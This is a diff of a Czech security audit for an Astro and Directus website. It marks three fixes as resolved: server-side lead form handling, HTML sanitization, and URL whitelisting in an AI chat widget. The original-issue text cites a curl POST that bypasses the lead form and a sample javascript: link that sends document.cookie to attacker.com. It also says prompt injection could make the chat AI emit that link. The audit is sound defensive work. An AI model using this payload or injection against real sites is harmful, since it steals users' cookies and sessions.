@@ -24,7 +24,16 @@ Hlavní rizika:
 ## Critical issues
 
 ### 1) Lead form bypass: anonymous POST na Directus `/items/leads`
-**Co**: Všechny lead formy (`sklad/[id].astro:1093`, `kontakt.astro:188`, `servis.astro`, `components/LeadForm.astro:100`, `components/ModelChatWidget.astro` přes API) posílají JSON přímo na `${DIRECTUS_URL}/items/leads` z prohlížeče.
+**STATUS: ✅ RESOLVED 2026-05-19**
+- `/api/lead.ts` SSR endpoint (rate limit 10/den/IP, honeypot, server-side validace)
+- Cloudflare Turnstile invisible (non-strict fallback)
+- Lead Writer role v Directus s pouze `create` permission
+- Public role: `leads` Create + Read = **No Access**
+- Refactor 5 forms (kontakt, servis, sklad detail, LeadForm component, AI chat)
+- VIN/model/brand kontext v leads
+- GDPR checkbox sjednocený
+
+**Co (původní problém)**: Všechny lead formy (`sklad/[id].astro:1093`, `kontakt.astro:188`, `servis.astro`, `components/LeadForm.astro:100`, `components/ModelChatWidget.astro` přes API) posílaly JSON přímo na `${DIRECTUS_URL}/items/leads` z prohlížeče.
 
 **Proč problém**:
 - Honeypot kontrola (`_hp_website`) běží POUZE v prohlížeči. Útočník/bot, který nezná HTML formy, jen pošle `curl -X POST https://directus.../items/leads -d '{...}'` a Directus to přijme.
@@ -43,7 +52,15 @@ Hlavní rizika:
 ---
 
 ### 2) `marked.parse()` → `set:html` bez sanitizace
-**Co**:
+**STATUS: ✅ RESOLVED 2026-05-19**
+- Nový helper `src/lib/sanitize.ts` (wrapper kolem `isomorphic-dompurify`)
+- `sanitizeHtml()` — pro články (povoluje p, a, ul, table, img...)
+- `sanitizeHtmlStrict()` — pro AI chat (jen základní inline formátování)
+- `model/[slug].astro:promo_description` — sanitizováno přes `sanitizeHtml`
+- `magazin/[slug].astro:article.body` — sanitizováno přes `sanitizeHtml`
+- ALLOWED_URI_REGEXP blokuje `javascript:`, `data:`, `vbscript:` schémata
+
+**Co (původní problém)**:
 - `model/[slug].astro:419-423` — `promo_description` z Directusu, `marked.parse()` → `set:html={promoDescriptionHtml}` na řádku 539.
 - `magazin/[slug].astro:81-88` — `article.body` přes `marked.parse()` → `set:html={wrappedHtml}` (řádek 148).
 
@@ -54,7 +71,13 @@ Hlavní rizika:
 ---
 
 ### 3) AI chat `markdownToHtml`: `javascript:` URL injection
-**Co**: `components/ModelChatWidget.astro:142-157` — funkce `markdownToHtml` nejdřív escapuje vstup, ale pak najde markdown linky a vloží **neescapované** `url` do `href="${url}"`.
+**STATUS: ✅ RESOLVED 2026-05-19**
+- `isSafeUrl()` whitelist: jen `http://`, `https://`, `mailto:`, `tel:`, relativní URLs
+- `escapeAttr()` escape href hodnoty (závorky, ampersandy, atd.)
+- Nepovolené URL (např. `javascript:`) → render jako plain text `[label](url)`, ne aktivní link
+- Plus `rel="noopener noreferrer"` na externí target=_blank (řeší tabnabbing)
+
+**Co (původní problém)**: `components/ModelChatWidget.astro:142-157` — funkce `markdownToHtml` nejdřív escapuje vstup, ale pak našla markdown linky a vložila **neescapované** `url` do `href="${url}"`.
 
 **Proč problém**:
 - AI z prompt injection může vrátit `[Klikni sem](javascript:fetch('https://attacker.com?'+document.cookie))` → render do DOM s funkčním JS URL.
